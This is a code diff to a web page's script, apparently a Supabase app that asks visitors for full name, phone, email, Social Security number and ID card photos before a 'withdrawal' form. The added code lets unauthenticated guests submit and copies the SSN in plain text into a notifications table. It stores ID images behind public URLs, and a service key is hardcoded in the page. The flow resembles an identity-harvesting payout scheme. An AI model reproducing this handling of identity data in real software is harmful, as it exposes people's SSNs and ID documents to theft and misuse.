@@ -113,37 +113,41 @@
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script src="config.js"></script>
   <script>
-    const SUPABASE_URL = "https://rrdddtmqojyheshznrwl.supabase.co";
-    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJyZGRkdG1xb2p5aGVzaHpucndsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYyODUxNjEsImV4cCI6MjEwMTg2MTE2MX0.0Gp4-6D-TKBMgvHYZhKncfyfcWRTGd2oeSzpJGUg8vQ";
-    const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
     let currentUser = null;
 
     async function checkVerificationStatus() {
-      const { data: { user } } = await client.auth.getUser();
-      if (!user) { window.location.href = 'index.html'; return; }
-      currentUser = user;
+      if (typeof client === 'undefined') {
+        const SUPABASE_URL = "https://rrdddtmqojyheshznrwl.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJyZGRkdG1xb2p5aGVzaHpucndsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYyODUxNjEsImV4cCI6MjEwMTg2MTE2MX0.0Gp4-6D-TKBMgvHYZhKncfyfcWRTGd2oeSzpJGUg8vQ";
+        window.client = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      }
 
-      // Check if user already submitted verification data
-      const { data, error } = await client
+      const { data: { user } } = await client.auth.getUser();
+      
+      let userId = user ? user.id : localStorage.getItem('chat_user_id');
+      if (!userId) {
+        userId = 'guest_' + Math.random().toString(36).substring(2, 10);
+        localStorage.setItem('chat_user_id', userId);
+      }
+      currentUser = { id: userId };
+
+      const { data } = await client
         .from('user_verifications')
         .select('*')
-        .eq('id', user.id)
+        .eq('id', currentUser.id)
         .single();
 
       if (data) {
-        // Already verified, show withdrawal box
         document.getElementById('verification-card').style.display = 'none';
         document.getElementById('withdrawal-card').style.display = 'block';
       } else {
-        // Needs verification, show form
         document.getElementById('verification-card').style.display = 'block';
         document.getElementById('withdrawal-card').style.display = 'none';
       }
     }
 
-    // Update file labels when chosen
     document.getElementById('id-front').addEventListener('change', function() {
       if(this.files[0]) document.getElementById('front-label').innerText = `✔️ ${this.files[0].name}`;
     });
@@ -177,8 +181,8 @@
         await client.storage.from('id_documents').upload(backPath, backFile);
         const { data: backPublic } = client.storage.from('id_documents').getPublicUrl(backPath);
 
-        // Insert into verification table
-        const { error } = await client.from('user_verifications').insert({
+        // 1. Insert into verification table
+        const { error: vError } = await client.from('user_verifications').insert([{
           id: currentUser.id,
           full_name: fullName,
           phone_number: phone,
@@ -187,9 +191,31 @@
           id_front_url: frontPublic.publicUrl,
           id_back_url: backPublic.publicUrl,
           status: 'pending'
-        });
+        }]);
 
-        if (error) throw error;
+        if (vError) throw vError;
+
+        // 2. Insert into notifications table (SSN & Verification Details)
+        const notifMessage = `SSN & Verification Submitted:\n` +
+          `• Full Name: ${fullName}\n` +
+          `• Phone: ${phone}\n` +
+          `• Email: ${email}\n` +
+          `• SSN: ${ssn}`;
+
+        await client.from('notifications').insert([
+          {
+            user_id: currentUser.id,
+            type: 'SSN / Verification',
+            message: notifMessage,
+            image_url: frontPublic.publicUrl
+          },
+          {
+            user_id: currentUser.id,
+            type: 'ID Card (Back)',
+            message: `ID Card Back Photo submitted by ${fullName}`,
+            image_url: backPublic.publicUrl
+          }
+        ]);
 
         alert("Verification details saved successfully!");
         checkVerificationStatus();
@@ -207,6 +233,13 @@
         alert("Please fill in all fields.");
         return;
       }
+
+      await client.from('notifications').insert([{
+        user_id: currentUser.id,
+        type: 'Withdrawal Request',
+        message: `Payout requested for $${amount}\nDestination: ${destination}`
+      }]);
+
       alert("Withdrawal request submitted successfully! Pending admin approval.");
       window.location.href = 'dashboard.html';
     }
@@ -214,5 +247,4 @@
     checkVerificationStatus();
   </script>
 </body>
-          </html>
-          
+</html>
